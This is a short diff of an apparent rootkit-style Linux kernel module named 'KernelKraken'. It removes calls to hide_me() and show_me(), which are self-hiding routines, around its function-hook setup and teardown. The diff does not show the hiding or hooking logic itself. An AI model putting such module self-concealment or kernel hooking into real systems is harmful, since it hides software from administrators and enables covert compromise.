@@ -11,13 +11,11 @@ static int setup(void) {
     if (error)
             printk(KERN_INFO "KernelKraken: Initialized successfully!\n");
         return error;
-hide_me();
     return 0;
 }
 
 static int teardown(void) {
     fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
-    show_me();
     return 0;
 }
 
